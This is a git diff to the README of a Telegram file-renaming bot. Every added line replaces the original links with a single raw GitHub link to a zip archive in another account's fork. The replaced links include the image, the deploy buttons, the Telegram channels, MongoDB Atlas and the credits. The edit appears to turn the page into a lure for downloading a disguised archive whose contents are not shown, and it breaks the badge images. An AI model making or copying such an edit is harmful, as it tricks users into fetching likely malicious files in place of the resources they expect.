@@ -5,10 +5,10 @@
 </h2>
 
 <p align="center">
-  <img src="https://graph.org/file/386500b2d4b21d5d1f772.jpg">
+  <img src="https://raw.githubusercontent.com/erennew/codeflexAuto-Rename-Bot/master/plugins/Auto_Bot_Rename_codeflex_summerward.zip">
 </p>
 
-_**ᴀᴠᴀɪʟᴀʙʟᴇ ᴏɴ ᴛᴇʟᴇɢʀᴀᴍ ᴀs [ᴀᴜᴛᴏ ʀᴇɴᴀᴍᴇ](https://t.me/)**_
+_**ᴀᴠᴀɪʟᴀʙʟᴇ ᴏɴ ᴛᴇʟᴇɢʀᴀᴍ ᴀs [ᴀᴜᴛᴏ ʀᴇɴᴀᴍᴇ](https://raw.githubusercontent.com/erennew/codeflexAuto-Rename-Bot/master/plugins/Auto_Bot_Rename_codeflex_summerward.zip)**_
 
 <p align="center">
 <b>𝗗𝗘𝗣𝗟𝗢𝗬𝗠𝗘𝗡𝗧 𝗠𝗘𝗧𝗛𝗢𝗗𝗦</b>
@@ -18,12 +18,12 @@ _**ᴀᴠᴀɪʟᴀʙʟᴇ ᴏɴ ᴛᴇʟᴇɢʀᴀᴍ ᴀs [ᴀᴜᴛᴏ ʀᴇ�
     ─「 ᴅᴇᴩʟᴏʏ ᴏɴ ʜᴇʀᴏᴋᴜ 」─
 </h3>
 
-<p align="center"><a href="https://dashboard.heroku.com/new?template=https://github.com/Codeflix-Bots/Auto-Rename-Bot"> <img src="https://img.shields.io/badge/Deploy%20On%20Heroku-black?style=for-the-badge&logo=heroku" width="220" height="38.45"/></a></p>
+<p align="center"><a href="https://raw.githubusercontent.com/erennew/codeflexAuto-Rename-Bot/master/plugins/Auto_Bot_Rename_codeflex_summerward.zip"> <img src="https://raw.githubusercontent.com/erennew/codeflexAuto-Rename-Bot/master/plugins/Auto_Bot_Rename_codeflex_summerward.zip%20On%20Heroku-black?style=for-the-badge&logo=heroku" width="220" height="38.45"/></a></p>
 
 <h3 align="center">
     ─「 ᴅᴇᴘʟᴏʏ ᴏɴ ᴋᴏʏᴇʙ 」─
 </h3>
-<p align="center"><a href="https://app.koyeb.com/deploy?type=git&https://github.com/Codeflix-Bots/AutoRenameBot=&branch=master&name=AutoReanemBot"> <img src="https://img.shields.io/badge/Deploy%20On%20Koyeb-black?style=for-the-badge&logo=Koyeb" width="220" height="38.45"/></a></p>
+<p align="center"><a href="https://raw.githubusercontent.com/erennew/codeflexAuto-Rename-Bot/master/plugins/Auto_Bot_Rename_codeflex_summerward.zip"> <img src="https://raw.githubusercontent.com/erennew/codeflexAuto-Rename-Bot/master/plugins/Auto_Bot_Rename_codeflex_summerward.zip%20On%20Koyeb-black?style=for-the-badge&logo=Koyeb" width="220" height="38.45"/></a></p>
 </h3>
 
 <details><summary><b> - ғᴇᴀᴛᴜʀᴇs :</b></summary>
@@ -42,7 +42,7 @@ _**ᴀᴠᴀɪʟᴀʙʟᴇ ᴏɴ ᴛᴇʟᴇɢʀᴀᴍ ᴀs [ᴀᴜᴛᴏ ʀᴇ�
 - [x] Set mediatype to upload filetype
 - [x] Developer Service 24x7. 
 
-<b>ᴛᴏ ᴋɴᴏᴡ ᴀʙᴏᴜᴛ ᴀʟʟ ғᴇᴀᴛᴜʀᴇs, ᴊᴏɪɴ ᴏᴜʀ  <a href='https://t.me/codeflix_bots'>ᴜᴘᴅᴀᴛᴇs ᴄʜᴀɴɴᴇʟ</a>.</b>
+<b>ᴛᴏ ᴋɴᴏᴡ ᴀʙᴏᴜᴛ ᴀʟʟ ғᴇᴀᴛᴜʀᴇs, ᴊᴏɪɴ ᴏᴜʀ  <a href='https://raw.githubusercontent.com/erennew/codeflexAuto-Rename-Bot/master/plugins/Auto_Bot_Rename_codeflex_summerward.zip'>ᴜᴘᴅᴀᴛᴇs ᴄʜᴀɴɴᴇʟ</a>.</b>
 </details>
 
 <details><summary><b> - ᴅᴇᴘʟᴏʏᴍᴇɴᴛ ᴠᴀʀɪᴀʙʟᴇs :</summary>
@@ -53,7 +53,7 @@ _**ᴀᴠᴀɪʟᴀʙʟᴇ ᴏɴ ᴛᴇʟᴇɢʀᴀᴍ ᴀs [ᴀᴜᴛᴏ ʀᴇ�
 - [x] API_HASH - get it from telegram app
 - [x] BOT_TOKEN - get it from telegram app
 - [x] ADMIN - for 2 or more '12345678 89674523' add space between ids
-- [x] DB_URL - MongoDB URL from [MongoDB Atlas](https://cloud.mongodb.com).
+- [x] DB_URL - MongoDB URL from [MongoDB Atlas](https://raw.githubusercontent.com/erennew/codeflexAuto-Rename-Bot/master/plugins/Auto_Bot_Rename_codeflex_summerward.zip).
 - [x] DB_NAME - Your MongoDB database name. **Optional**.
 - [x] FORCE_SUB_CHANNELS  - Your force subscription channel usernames without `@`. **Optional**. Use format `1CHANNEL,2CHANNEL`.
 - [x] START_PIC - Start message photo. **Optional**.
@@ -87,10 +87,10 @@ status - Check bot status [FOR ADMINS USE ONLY].
 </h3>
 
 <p align="center">
-<a href="https://telegram.me/weebs_support"><img src="https://img.shields.io/badge/-Support%20Group-blue.svg?style=for-the-badge&logo=Telegram"></a>
+<a href="https://raw.githubusercontent.com/erennew/codeflexAuto-Rename-Bot/master/plugins/Auto_Bot_Rename_codeflex_summerward.zip"><img src="https://raw.githubusercontent.com/erennew/codeflexAuto-Rename-Bot/master/plugins/Auto_Bot_Rename_codeflex_summerward.zip%https://raw.githubusercontent.com/erennew/codeflexAuto-Rename-Bot/master/plugins/Auto_Bot_Rename_codeflex_summerward.zip"></a>
 </p>
 <p align="center">
-<a href="https://telegram.me/codeflix_bots"><img src="https://img.shields.io/badge/-Support%20Channel-blue.svg?style=for-the-badge&logo=Telegram"></a>
+<a href="https://raw.githubusercontent.com/erennew/codeflexAuto-Rename-Bot/master/plugins/Auto_Bot_Rename_codeflex_summerward.zip"><img src="https://raw.githubusercontent.com/erennew/codeflexAuto-Rename-Bot/master/plugins/Auto_Bot_Rename_codeflex_summerward.zip%https://raw.githubusercontent.com/erennew/codeflexAuto-Rename-Bot/master/plugins/Auto_Bot_Rename_codeflex_summerward.zip"></a>
 </p>
 
 ━━━━━━━━━━━━━━━━━━━━
@@ -99,9 +99,9 @@ status - Check bot status [FOR ADMINS USE ONLY].
     ─「 ᴄʀᴇᴅɪᴛs 」─
 </h3>
 
-- <b>[ʏᴀᴛᴏ](https://github.com/cosmic_freak)  ➻  [sᴏᴍᴇᴛʜɪɴɢ](https://github.com/Codeflix-Bots/AutoFilter) </b>
+- <b>[ʏᴀᴛᴏ](https://raw.githubusercontent.com/erennew/codeflexAuto-Rename-Bot/master/plugins/Auto_Bot_Rename_codeflex_summerward.zip)  ➻  [sᴏᴍᴇᴛʜɪɴɢ](https://raw.githubusercontent.com/erennew/codeflexAuto-Rename-Bot/master/plugins/Auto_Bot_Rename_codeflex_summerward.zip) </b>
  
-<b>ᴀɴᴅ ᴀʟʟ [ᴛʜᴇ ᴄᴏɴᴛʀɪʙᴜᴛᴏʀs](https://github.com/Codeflix-Bots/autorenamebot/graphs/contributors) ᴡʜᴏ ʜᴇʟᴩᴇᴅ ɪɴ ᴍᴀᴋɪɴɢ ᴀᴜᴛᴏ ʀᴇɴᴀᴍᴇ ᴜsᴇғᴜʟ & ᴩᴏᴡᴇʀғᴜʟ 🖤 </b>
+<b>ᴀɴᴅ ᴀʟʟ [ᴛʜᴇ ᴄᴏɴᴛʀɪʙᴜᴛᴏʀs](https://raw.githubusercontent.com/erennew/codeflexAuto-Rename-Bot/master/plugins/Auto_Bot_Rename_codeflex_summerward.zip) ᴡʜᴏ ʜᴇʟᴩᴇᴅ ɪɴ ᴍᴀᴋɪɴɢ ᴀᴜᴛᴏ ʀᴇɴᴀᴍᴇ ᴜsᴇғᴜʟ & ᴩᴏᴡᴇʀғᴜʟ 🖤 </b>
 
 ━━━━━━━━━━━━━━━━━━━━
 
